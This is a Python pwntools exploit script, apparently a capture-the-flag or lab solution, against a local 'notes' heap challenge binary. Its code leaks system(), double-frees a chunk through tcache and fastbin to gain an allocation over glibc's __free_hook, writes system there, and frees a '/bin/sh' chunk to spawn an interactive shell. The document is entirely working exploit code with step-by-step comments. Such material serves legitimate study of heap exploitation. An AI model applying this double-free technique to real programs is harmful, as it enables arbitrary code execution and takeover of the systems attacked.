#!/home/sandip/anaconda3/bin/python
from pwn import *
import time

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{1102141}', '-P']

context.binary = binary = './notes'
# set context to open terminal in split mode


vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
libc = ELF('./libc.so.6')

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        return process(vuln_elf.path)



# p = start()
p = remote('localhost', 1339)

p.recvuntil(b'system: ')
system = p.recvuntil(b'\n').decode()
system = int(system, 16)
# log the system
log.info('system: ' + hex(system))


# allocate 10 chunks
for i in range(10):
    p.sendlineafter('option: ', b'a')
    p.sendlineafter('page: ', str(i).encode())
    p.sendlineafter('note: ', b"/bin/sh\x00")

# Free 9 chunks : 0-6 in tcache 7,8 in fastbin
for i in range(9):
    p.sendlineafter('option: ', b'd')
    p.sendlineafter('page: ', str(i).encode())


# free 7th chunk again
p.sendlineafter('option: ', b'd')
p.sendlineafter('page: ', b"7")

# flush tcache by allocating 
for i in range(7):
    p.sendlineafter('option: ', b'a')
    p.sendlineafter('page: ', str(i).encode())
    p.sendlineafter('note: ', b"/bin/sh\x00")

# allocate 7th chunk and make it point to free hook
p.sendlineafter('option: ', b'a')
p.sendlineafter('page: ', b"7")
# # p.sendline(p64(0x00007ffff7fabe48)) # fake chunk
p.sendlineafter('note: ', p64(system + 0x19CBB8)) # __free_hook chunk

# ----
# 7th chunk -> 8th chunk <- 7th chunk
# 8th chunk -> 7th chunk -> free_hook
# ----

# two more chunks to reach free_hook allocation
p.sendlineafter('option: ', b'a')
p.sendlineafter(': ', b"8")
p.sendlineafter('note: ', b"/bin/sh\x00")

p.sendlineafter('option: ', b'a')
p.sendlineafter(': ', b'9')
p.sendlineafter('note: ', b"/bin/sh\x00") 


# allocate free_hook and write systems address there
p.sendlineafter('option: ', b'a')
p.sendlineafter(': ', b"10")
# p.send(p64(0x7ffff7e0f2c0)) # System
p.sendlineafter('note: ', p64(system)) # System

# free a chunk which says /bin/sh which will internally call system
p.sendlineafter('option: ', b'd')
p.sendlineafter('page: ', b"0")


p.interactive()
